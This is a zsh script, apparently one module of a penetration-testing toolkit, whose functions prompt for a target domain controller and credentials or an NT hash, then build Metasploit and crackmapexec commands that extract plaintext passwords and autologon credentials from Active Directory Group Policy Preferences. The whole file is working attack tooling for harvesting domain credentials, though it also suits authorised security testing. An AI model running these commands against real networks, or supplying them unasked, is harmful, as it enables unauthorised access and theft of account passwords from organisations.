#!/usr/bin/env zsh

############################################################# 
# nb-ad-gpp
#############################################################
nb-ad-gpp-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-gpp
------------
The nb-ad-gpp namespace contains commands for 

Commands
--------
nb-ad-gpp-install         installs dependencies
nb-ad-gpp-msf             use metasploit module to look for the cPassword
nb-ad-gpp-cme-password    retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences
nb-ad-gpp-cme-autologin   searches the domain controller for registry.xml to find autologon information and returns the username and password

DOC
}

nb-ad-gpp-install() {
    __info "Running $0..."
    __pkgs impacket
}

nb-ad-gpp-msf() {
    __check-project
	  __check-domain
	  __ask "Enter the IP address of the target DC server"
	  nb-vars-set-rhost
    __ask "Enter a user account"
    nb-vars-set-user
    __ask "Enter a password for authentication"
    nb-vars-set-pass

    # Generate a random number for the file name
    rand=$(shuf -i 1000-9999 -n 1)
    rc_file="/tmp/msf_smb_enum_gpp_$rand.rc"

    echo "use auxiliary/scanner/smb/smb_enum_gpp" > "$rc_file"
    echo "set RHOST ${__RHOST}" >> "$rc_file"
    echo "set SMBUser ${__USER}" >> "$rc_file"
    echo "set SMBPass ${__PASS}" >> "$rc_file"
    echo "set SMBDomain ${__DOMAIN}" >> "$rc_file"
    echo "exploit" >> "$rc_file"

    print -z "msfconsole -n -q -r \"$rc_file\" "
}

nb-ad-gpp-cme-password() {
    __check-project
    __ask "Enter RHOST of the target DC server"
    nb-vars-set-rhost
	  __check-user
    __check-domain
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        __check-pass
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_password | tee -a $(__netadpath)/cme-GPP-password.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NT:LM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password | tee -a $(__netadpath)/cme-GPP-password.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-gpp-cme-autologin() {
    __check-project
    __ask "Enter RHOST of the target DC server"
    nb-vars-set-rhost
	  __check-user
    __check-domain
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        __check-pass
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} -M gpp_autologin | tee -a $(__netadpath)/cme-GPP-autologin.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NT:LM hash for authentication"
        __check-hash
        print -z "crackmapexec smb ${__RHOST} -u ${__USER} -H ${__HASH} --local-auth -M gpp_autologin | tee -a $(__netadpath)/cme-GPP-autologin.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}
